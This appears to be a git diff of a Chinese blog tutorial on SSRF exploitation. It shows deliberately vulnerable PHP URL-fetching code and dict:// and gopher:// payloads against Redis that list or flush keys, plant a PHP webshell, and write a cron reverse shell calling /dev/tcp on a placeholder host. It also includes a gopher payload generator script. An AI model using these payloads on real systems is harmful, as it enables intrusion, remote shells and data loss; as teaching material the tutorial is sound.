@@ -19,18 +19,18 @@
   <meta name="author" content="Candy">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一、基础概念服务端请求伪造(SSRF)是一种攻击者通过构造恶意请求，诱导服务器向非预期目标发起网络请求的安全漏洞。攻击者利用存在漏洞的服务器作为代理，绕过访问限制，访问内部资源或第三方系统，可能导致敏感信息泄露、内网探测、甚至远程代码执行。 攻击目标：一般是外网无法直接访问的内部系统。 二、漏洞原理2.1 漏洞原因 用户可控数据：应用程序接收用户提供的 url 或域名（例如图片下载、API 调用、">
+    <meta name="description" content="一、基础概念 服务端请求伪造(SSRF) 是一种攻击者通过构造恶意请求，诱导服务器向非预期目标发起网络请求的安全漏洞。攻击者利用存在漏洞的服务器作为代理，绕过访问限制，访问内部资源或第三方系统，可能导致敏感信息泄露、内网探测、甚至远程代码执行。 攻击目标：一般是外网无法直接访问的内部系统。 二、漏洞原理2.1 漏洞原因 用户可控数据：应用程序接收用户提供的 url 或域名（例如图片下载、API 调">
 <meta property="og:type" content="article">
 <meta property="og:title" content="web漏洞之SSRF">
 <meta property="og:url" content="http://candyb0x.github.io/2025/02/20/web%E6%BC%8F%E6%B4%9E%E4%B9%8BSSRF/index.html">
 <meta property="og:site_name" content="Welcome Candy Box">
-<meta property="og:description" content="一、基础概念服务端请求伪造(SSRF)是一种攻击者通过构造恶意请求，诱导服务器向非预期目标发起网络请求的安全漏洞。攻击者利用存在漏洞的服务器作为代理，绕过访问限制，访问内部资源或第三方系统，可能导致敏感信息泄露、内网探测、甚至远程代码执行。 攻击目标：一般是外网无法直接访问的内部系统。 二、漏洞原理2.1 漏洞原因 用户可控数据：应用程序接收用户提供的 url 或域名（例如图片下载、API 调用、">
+<meta property="og:description" content="一、基础概念 服务端请求伪造(SSRF) 是一种攻击者通过构造恶意请求，诱导服务器向非预期目标发起网络请求的安全漏洞。攻击者利用存在漏洞的服务器作为代理，绕过访问限制，访问内部资源或第三方系统，可能导致敏感信息泄露、内网探测、甚至远程代码执行。 攻击目标：一般是外网无法直接访问的内部系统。 二、漏洞原理2.1 漏洞原因 用户可控数据：应用程序接收用户提供的 url 或域名（例如图片下载、API 调">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-02-20T07:43:27.000Z">
-<meta property="article:modified_time" content="2025-08-17T10:06:29.496Z">
+<meta property="article:modified_time" content="2025-12-30T17:06:40.771Z">
 <meta property="article:author" content="Candy">
-<meta property="article:tag" content="SSRF">
 <meta property="article:tag" content="基础漏洞">
+<meta property="article:tag" content="SSRF">
 <meta name="twitter:card" content="summary_large_image">
   
   
@@ -255,7 +255,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.5k 字
+          4.2k 字
         
       </span>
     
@@ -266,7 +266,7 @@
         
         
         
-          21 分钟
+          35 分钟
         
       </span>
     
@@ -317,7 +317,7 @@
             
               <div class="markdown-body">
                 
-                <h1 id="一、基础概念"><a href="#一、基础概念" class="headerlink" title="一、基础概念"></a>一、基础概念</h1><p><strong>服务端请求伪造(SSRF)<strong>是一种攻击者通过构造恶意请求，</strong>诱导服务器向非预期目标发起网络请求</strong>的安全漏洞。攻击者利用存在漏洞的服务器作为代理，绕过访问限制，访问内部资源或第三方系统，可能导致敏感信息泄露、内网探测、甚至远程代码执行。</p>
+                <h1 id="一、基础概念"><a href="#一、基础概念" class="headerlink" title="一、基础概念"></a>一、基础概念</h1><p> <strong>服务端请求伪造(SSRF)</strong> 是一种攻击者通过构造恶意请求，<strong>诱导服务器向非预期目标发起网络请求的安全漏洞</strong>。攻击者利用存在漏洞的服务器作为代理，绕过访问限制，访问内部资源或第三方系统，可能导致敏感信息泄露、内网探测、甚至远程代码执行。</p>
 <p>攻击目标：一般是外网无法直接访问的内部系统。</p>
 <h1 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h1><h2 id="2-1-漏洞原因"><a href="#2-1-漏洞原因" class="headerlink" title="2.1 漏洞原因"></a>2.1 漏洞原因</h2><ol>
 <li><strong>用户可控数据</strong>：应用程序接收用户提供的 url 或域名（例如图片下载、API 调用、网页预览功能）。</li>
@@ -342,20 +342,20 @@
 <li>fopen()</li>
 <li>readfile()</li>
 </ol>
-<h2 id="3-1-file-get-contents"><a href="#3-1-file-get-contents" class="headerlink" title="3.1 file_get_contents()"></a>3.1 file_get_contents()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="3-1-file-get-contents"><a href="#3-1-file-get-contents" class="headerlink" title="3.1 file_get_contents()"></a>3.1 file_get_contents()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <blockquote>
-<p><code>**file_get_content**</code>函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</p>
+<p><strong>file_get_content</strong>函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</p>
 </blockquote>
 <h2 id="3-2-fsockopen"><a href="#3-2-fsockopen" class="headerlink" title="3.2 fsockopen()"></a>3.2 fsockopen()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span></span>) </span>&#123; <br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);   <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <blockquote>
-<p><code>**fsockopen**</code>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p>
+<p><strong>fsockopen</strong>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p>
 </blockquote>
 <h2 id="3-3-curl-exec"><a href="#3-3-curl-exec" class="headerlink" title="3.3 curl_exec()"></a>3.3 curl_exec()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$curlobj</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<span class="hljs-comment">// 创建新的 cURL 资源</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<span class="hljs-comment">// 设置 URL 和相应的选项</span><br>    <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curlobj</span>);<span class="hljs-comment">// 抓取 URL 并把它传递给浏览器</span><br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curlobj</span>);<span class="hljs-comment">// 关闭 cURL 资源，并且释放系统资源</span><br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span>.<span class="hljs-title function_ invoke__">rand</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$result</span>); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <blockquote>
-<p><code>**curl_exec**</code>函数用于执行指定的cURL会话</p>
+<p><strong>curl_exec</strong>函数用于执行指定的cURL会话</p>
 </blockquote>
 <h1 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h1><h2 id="4-1-ssrf-端口探测"><a href="#4-1-ssrf-端口探测" class="headerlink" title="4.1 ssrf 端口探测"></a>4.1 ssrf 端口探测</h2><ul>
 <li>http 协议探测</li>
@@ -374,7 +374,26 @@
 
 <h2 id="4-3-dict-协议利用"><a href="#4-3-dict-协议利用" class="headerlink" title="4.3 dict 协议利用"></a>4.3 dict 协议利用</h2><h3 id="4-3-1-dict-协议读取-redis-版本信息"><a href="#4-3-1-dict-协议读取-redis-版本信息" class="headerlink" title="4.3.1 dict 协议读取 redis 版本信息"></a>4.3.1 dict 协议读取 redis 版本信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">http://localhost/ssrf.php?url=dict://127.0.0.1:6379/info<br></code></pre></td></tr></table></figure>
 
-<h3 id="4-3-2-dict-协议利用-redis-写文件"><a href="#4-3-2-dict-协议利用-redis-写文件" class="headerlink" title="4.3.2 dict 协议利用 redis 写文件"></a>4.3.2 dict 协议利用 redis 写文件</h3><p>以下方法可以实现修改文件内容、新建文件写入内容；</p>
+<h3 id="4-3-2-dict-协议操作redis-键值对"><a href="#4-3-2-dict-协议操作redis-键值对" class="headerlink" title="4.3.2 dict 协议操作redis 键值对"></a>4.3.2 dict 协议操作redis 键值对</h3><ol>
+<li>获取所有键名</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?url=dict://127.0.0.1:6379/keys:*<br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>获取指定键的值</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?url=dict://127.0.0.1:6379/get:keyname<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>设置指定键的值</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">dict://127.0.0.1:6379/set:keyname:keyvalue<br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>清空数据库</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">dict://127.0.0.1:6379/flushall<br></code></pre></td></tr></table></figure>
+<h3 id="4-3-3-dict-协议利用-redis-写文件"><a href="#4-3-3-dict-协议利用-redis-写文件" class="headerlink" title="4.3.3 dict 协议利用 redis 写文件"></a>4.3.3 dict 协议利用 redis 写文件</h3><p>以下方法可以实现修改文件内容、新建文件写入内容；</p>
 <ol>
 <li>通过<code>info</code>探测是否设置口令</li>
 </ol>
@@ -403,12 +422,13 @@
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?url=dict://127.0.0.1:6380/save<br></code></pre></td></tr></table></figure>
 
-<h3 id="4-3-3-dict-配置定时任务反弹-shell"><a href="#4-3-3-dict-配置定时任务反弹-shell" class="headerlink" title="4.3.3 dict 配置定时任务反弹 shell"></a>4.3.3 dict 配置定时任务反弹 shell</h3><p>要求系统存在<code>cron</code>，且知道其相应的配置文件，假设配置文件为<code>/etc/crontab</code>，与上述写文件相似，将定时任务写到<code>/etc/crontab</code></p>
+<h3 id="4-3-4-dict-配置定时任务反弹-shell"><a href="#4-3-4-dict-配置定时任务反弹-shell" class="headerlink" title="4.3.4 dict 配置定时任务反弹 shell"></a>4.3.4 dict 配置定时任务反弹 shell</h3><p>要求系统存在<code>cron</code>，且知道其相应的配置文件，假设配置文件为<code>/etc/crontab</code>，与上述写文件相似，将定时任务写到<code>/etc/crontab</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">?url=dict://127.0.0.1:6379/flushall<br>?url=dict://127.0.0.1:6379/auth:123456<br>?url=dict://127.0.0.1:6379/config:set:dir:/etc/<br>?url=dict://127.0.0.1:6379/config:set:dbfilename:crontab<br>?url=dict://127.0.0.1:6379/config:set:crontab:\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/xx.xx.xxx.xx/4444 0&gt;&amp;1\n\n<br>?url=dict://127.0.0.1:6379/save<br></code></pre></td></tr></table></figure>
+
 
 <h2 id="4-4-gopher-协议利用"><a href="#4-4-gopher-协议利用" class="headerlink" title="4.4 gopher 协议利用"></a>4.4 gopher 协议利用</h2><p>相关工具和资料</p>
 <ol>
-<li><a target="_blank" rel="noopener" href="https://github.com/firebroo/sec_tools/tree/master">https://github.com/firebroo/sec_tools&#x2F;tree&#x2F;master</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/firebroo/sec_tools/tree/master">https://github.com/firebroo/sec_tools/tree/master</a></li>
 <li><a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></li>
 <li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112055947">https://zhuanlan.zhihu.com/p/112055947</a></li>
 </ol>
@@ -424,7 +444,11 @@
 <p>gopher发送post请求</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">//url编码前的内容<br>gopher://192.168.47.244:80/_POST /b.php?q=1 HTTP/1.1<br>Host: 192.168.47.244<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 8<br><br>q=Myname<br><br>//url编码后的内容<br>gopher://192.168.47.244:80/_POST%20/b.php%3Fq%3D1%20HTTP/1.1%0D%0AHost%3A%20192.168.47.244%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%208%0D%0A%0D%0Aq%3DMyname<br></code></pre></td></tr></table></figure>
 
-<h3 id="4-4-3-gopher-利用-redis-写文件"><a href="#4-4-3-gopher-利用-redis-写文件" class="headerlink" title="4.4.3 gopher 利用 redis 写文件"></a>4.4.3 gopher 利用 redis 写文件</h3><p>这里我们主要运用一下项目<a target="_blank" rel="noopener" href="https://github.com/firebroo/sec_tools/tree/master">https://github.com/firebroo/sec_tools&#x2F;tree&#x2F;master</a></p>
+<h3 id="4-4-3-Gopher-Payload-生成脚本"><a href="#4-4-3-Gopher-Payload-生成脚本" class="headerlink" title="4.4.3 Gopher Payload 生成脚本"></a>4.4.3 Gopher Payload 生成脚本</h3><p>以下 Python 脚本可以自动将原始 HTTP 请求（GET&#x2F;POST）转换为 Gopher 协议 Payload。使用时，只需将 BurpSuite 等工具抓取的原始数据包粘贴到脚本中运行即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_gopher_payload</span>(<span class="hljs-params">raw_request, target_ip, target_port</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    将原始 HTTP 请求转换为 Gopher Payload</span><br><span class="hljs-string">    :param raw_request: 原始 HTTP 请求字符串</span><br><span class="hljs-string">    :param target_ip: 目标 IP</span><br><span class="hljs-string">    :param target_port: 目标端口</span><br><span class="hljs-string">    :return: 完整的 gopher URL</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 1. URL 编码所有字符（包括特殊字符）</span><br>    <span class="hljs-comment"># Gopher 协议要求所有字符都要进行 URL 编码</span><br>    <span class="hljs-comment"># 注意：换行符 \r\n 必须被编码为 %0D%0A</span><br>    <br>    <span class="hljs-comment"># 替换换行符为 \r\n (以防复制粘贴时格式丢失)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;\r\n&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> raw_request <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-keyword">in</span> raw_request:<br>        raw_request = raw_request.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)<br><br>    <span class="hljs-comment"># 对 payload 进行二次 URL 编码</span><br>    <span class="hljs-comment"># 第一次编码是将字符转换为 %XX 格式，用于构建符合 Gopher 协议的数据包</span><br>    encoded_request = urllib.parse.quote(raw_request, safe=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 二次编码：因为 Gopher 协议通常通过 URL 传递，浏览器或 curl 会进行一次解码</span><br>    <span class="hljs-comment"># 所以我们需要发送二次编码后的数据，确保到达目标时是正确的 TCP 数据流</span><br>    <span class="hljs-comment"># 这里我们手动将 % 替换为 %25 是一种简单的二次编码方式，或者再次 quote</span><br>    <span class="hljs-comment"># 但通常 Gopher payload 直接作为 content 发送时，一次编码 + _ (下划线) 即可</span><br>    <span class="hljs-comment"># 如果是在 Web 参数中提交（如 ?url=gopher://...），则需要对特殊字符再次编码</span><br>    <br>    <span class="hljs-comment"># 这里的 payload 是标准的 gopher 格式： gopher://ip:port/_data</span><br>    <span class="hljs-comment"># data 部分通常需要 URL 编码。</span><br>    <br>    payload = <span class="hljs-string">&quot;gopher://&#123;&#125;:&#123;&#125;/_&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(target_ip, target_port, encoded_request)<br>    <br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 在这里粘贴原始 HTTP 请求包</span><br>    <span class="hljs-comment"># 注意：</span><br>    <span class="hljs-comment"># 1. 确保 Content-Length 正确（如果是 POST）</span><br>    <span class="hljs-comment"># 2. 保持请求头格式完整</span><br>    raw_http_request = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">POST /b.php?q=1 HTTP/1.1</span><br><span class="hljs-string">Host: 192.168.47.244</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 8</span><br><span class="hljs-string"></span><br><span class="hljs-string">q=Myname</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>    target_ip = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>    target_port = <span class="hljs-string">&quot;80&quot;</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Generating Gopher Payload...&quot;</span>)<br>    gopher_url = generate_gopher_payload(raw_http_request, target_ip, target_port)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[+] Gopher Payload:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(gopher_url)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[+] For Curl:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;curl &quot;&#123;&#125;&quot;&#x27;</span>.<span class="hljs-built_in">format</span>(gopher_url))<br>    <br>    <span class="hljs-comment"># 如果通过 Web 参数提交，建议对 payload 部分再进行一次 URL 编码</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[+] For Web URL Parameter (Double Encoded):&quot;</span>)<br>    web_payload = gopher_url.replace(<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;%25&quot;</span>)<br>    <span class="hljs-built_in">print</span>(web_payload)<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="4-4-4-gopher-利用-redis-写文件"><a href="#4-4-4-gopher-利用-redis-写文件" class="headerlink" title="4.4.4 gopher 利用 redis 写文件"></a>4.4.4 gopher 利用 redis 写文件</h3><p>这里我们主要运用一下项目<a target="_blank" rel="noopener" href="https://github.com/firebroo/sec_tools/tree/master">https://github.com/firebroo/sec_tools/tree/master</a></p>
 <p>redis TCP Stream 数据读取内容编排方式</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">*&lt;参数数量&gt; CR LF<br>$&lt;参数 1 的字节数量&gt; CR LF<br>&lt;参数 1 的数据&gt; CR LF<br>...<br>$&lt;参数 N 的字节数量&gt; CR LF<br>&lt;参数 N 的数据&gt; CR LF<br></code></pre></td></tr></table></figure>
 
@@ -438,25 +462,96 @@
 <p>只需要在payload前面加上需要攻击机器的gopher:&#x2F;&#x2F;ip:port&#x2F;_使用curl就行,最终payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">gopher://127.0.0.1:6379/_%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%34%0d%0a%2f%74%6d%70%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%39%0d%0a%73%68%65%6c%6c%2e%70%68%70%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%38%0d%0a%77%65%62%73%68%65%6c%6c%0d%0a%24%31%38%0d%0a%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%3f%3e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a<br></code></pre></td></tr></table></figure>
 
-<h3 id="4-4-4-gopher-配置定时任务反弹-shell"><a href="#4-4-4-gopher-配置定时任务反弹-shell" class="headerlink" title="4.4.4 gopher 配置定时任务反弹 shell"></a>4.4.4 gopher 配置定时任务反弹 shell</h3><p>运用一下项目<a target="_blank" rel="noopener" href="https://github.com/firebroo/sec_tools/tree/master">https://github.com/firebroo/sec_tools&#x2F;tree&#x2F;master</a></p>
+<h3 id="4-4-5-gopher-配置定时任务反弹-shell"><a href="#4-4-5-gopher-配置定时任务反弹-shell" class="headerlink" title="4.4.5 gopher 配置定时任务反弹 shell"></a>4.4.5 gopher 配置定时任务反弹 shell</h3><p>运用一下项目<a target="_blank" rel="noopener" href="https://github.com/firebroo/sec_tools/tree/master">https://github.com/firebroo/sec_tools/tree/master</a></p>
 <p>在 redis.cmd 文件输入自己需要执行的命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">flushall<br>config set dir /etc/<br>config set dbfilename crontab<br>config set crontab \n\n* * * * root bash -i &gt;&amp; /dev/tcp/xx.xx.xxx.xx/44444 0&gt;&amp;1 \n\n<br>save<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">flushall<br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /etc/<br>config <span class="hljs-built_in">set</span> dbfilename crontab<br>config <span class="hljs-built_in">set</span> crontab \n\n* * * * root bash -i &gt;&amp; /dev/tcp/xx.xx.xxx.xx/44444 0&gt;&amp;1 \n\n<br>save<br></code></pre></td></tr></table></figure>
 
 <p>得到 tcp 数据流后利用 gopher 协议发送即可。</p>
-<h1 id="五、ssrf-常见绕过方式"><a href="#五、ssrf-常见绕过方式" class="headerlink" title="五、ssrf 常见绕过方式"></a>五、ssrf 常见绕过方式</h1><h2 id="5-1-常用绕过方法"><a href="#5-1-常用绕过方法" class="headerlink" title="5.1 常用绕过方法"></a>5.1 常用绕过方法</h2><ol>
